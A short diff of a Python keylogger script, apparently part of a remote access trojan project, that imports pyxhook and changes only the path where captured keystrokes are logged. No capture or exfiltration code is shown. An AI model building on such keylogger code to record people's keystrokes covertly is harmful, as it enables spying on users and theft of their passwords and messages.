@@ -1,6 +1,6 @@
 import pyxhook
 
-log_file='/Users/architgupta/Desktop/log.txt'
+log_file='/home/ubuntu/RAT-460/logs/keylogger/log.txt'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
